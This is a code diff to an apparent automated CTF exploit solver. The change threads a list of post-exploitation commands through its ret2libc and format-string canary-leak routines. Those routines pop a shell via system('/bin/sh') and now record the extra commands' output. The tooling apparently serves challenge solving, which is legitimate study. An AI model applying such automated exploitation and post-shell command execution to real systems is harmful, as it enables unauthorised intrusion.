@@ -44,6 +44,7 @@ class SolveResult:
     facts: dict = field(default_factory=dict)
     error: str = ""
     flag_only: bool = False
+    cmds: list = field(default_factory=list)
 
     def as_dict(self) -> dict:
         return {
@@ -55,13 +56,21 @@ class SolveResult:
             "attempt_count": len(self.attempts),
             "flag_only": self.flag_only,
             "facts": self.facts,
+            "cmds": [{"cmd": c, "out": o.decode("latin-1", "replace")} for c, o in self.cmds],
             "attempts": [a.brief() for a in self.attempts],
             "error": self.error,
         }
 
 
+def _unpack4(ret):
+    """兼容 3/4 元组返回。"""
+    if len(ret) >= 4:
+        return ret[0], ret[1], ret[2], ret[3]
+    return ret[0], ret[1], ret[2], []
+
+
 def solve(ch: Challenge, max_attempts: int = 80, verbose: bool = True,
-          budget: float = 240.0) -> SolveResult:
+          budget: float = 240.0, post_cmds: list = None) -> SolveResult:
     t0 = time.time()
     res = SolveResult(name=ch.name, ok=False)
     try:
@@ -110,23 +119,25 @@ def solve(ch: Challenge, max_attempts: int = 80, verbose: bool = True,
                 return res
             tried += 1
             t1 = time.time()
+            cmds = []
             if plan.tag.startswith("canary:"):
-                ok, detail, out = _try_canary_fmt(ch, f, plan)
+                ok, detail, out, cmds = _unpack4(_try_canary_fmt(ch, f, plan, post_cmds))
                 att = Attempt(plan.strategy, plan.desc, ok, time.time() - t1, out)
             elif plan.tag == "flag":
                 r = execute_flag(ch, plan.sends)
                 ok, detail, out = r.ok, r.note, r.output
                 att = Attempt(plan.strategy, plan.desc, ok, time.time() - t1, r.output, r.error)
             elif plan.tag.startswith("stage1:"):
-                ok, detail, out = _try_ret2libc(ch, f, plan)
+                ok, detail, out, cmds = _unpack4(_try_ret2libc(ch, f, plan, post_cmds))
                 att = Attempt(plan.strategy, plan.desc, ok, time.time() - t1, out)
             else:
-                r = execute(ch, plan.sends)
+                r = execute(ch, plan.sends, post_cmds=post_cmds)
                 if not r.ok and r.error:
                     # 进程提前退出属于时序抖动，重试一次
-                    r = execute(ch, plan.sends)
-                ok, detail, out = r.ok, "", r.output
+                    r = execute(ch, plan.sends, post_cmds=post_cmds)
+                ok, detail, out, cmds = r.ok, "", r.output, r.cmds
                 att = Attempt(plan.strategy, plan.desc, ok, time.time() - t1, r.output, r.error)
+            res.cmds = cmds or []
             res.attempts.append(att)
             if ok:
                 res.ok = True
@@ -147,7 +158,7 @@ def solve(ch: Challenge, max_attempts: int = 80, verbose: bool = True,
 
 
 # --------------------------------------------------------------------------- ret2libc
-def _try_ret2libc(ch: Challenge, f: Facts, plan: S.Plan):
+def _try_ret2libc(ch: Challenge, f: Facts, plan: S.Plan, post_cmds: list = None):
     """同一进程内两阶段：泄漏 libc -> 回 main -> system('/bin/sh')。
 
     注意：stage2 必须复用 stage1 的进程，否则 ASLR 变了，算出来的地址全废。
@@ -205,10 +216,10 @@ def _try_ret2libc(ch: Challenge, f: Facts, plan: S.Plan):
                 break
             _t.sleep(0.2)
             out += p.recvrepeat(0.15)
-            r = verify_shell(p, timeout=_verify_timeout(ch))
+            r = verify_shell(p, timeout=_verify_timeout(ch), post_cmds=post_cmds)
             out += r.output
             if r.ok:
-                return True, detail, out
+                return True, detail, out, r.cmds
         return False, "stage2 failed: " + detail, out
     finally:
         try:
@@ -217,7 +228,7 @@ def _try_ret2libc(ch: Challenge, f: Facts, plan: S.Plan):
             pass
 
 
-def _try_canary_fmt(ch: Challenge, f: Facts, plan: S.Plan):
+def _try_canary_fmt(ch: Challenge, f: Facts, plan: S.Plan, post_cmds: list = None):
     """fmt 泄漏 canary -> 溢出泄漏 GOT -> 回 main -> system('/bin/sh')，全程同进程。"""
     import time as _t
     from .run import spawn, verify_shell, FLAG_RE
@@ -302,10 +313,10 @@ def _try_canary_fmt(ch: Challenge, f: Facts, plan: S.Plan):
             stage2 = pad + ch.p64(canary) + tail + chain2
             p.send(stage2 + (b"\n" if sink in S.TERM_SINKS else b""))
             _t.sleep(0.2)
-            r = verify_shell(p, timeout=_verify_timeout(ch))
+            r = verify_shell(p, timeout=_verify_timeout(ch), post_cmds=post_cmds)
             out += r.output
             if r.ok:
-                return True, f"canary={hex(canary)} base={hex(base)}", out
+                return True, f"canary={hex(canary)} base={hex(base)}", out, r.cmds
         finally:
             try:
                 p.close()
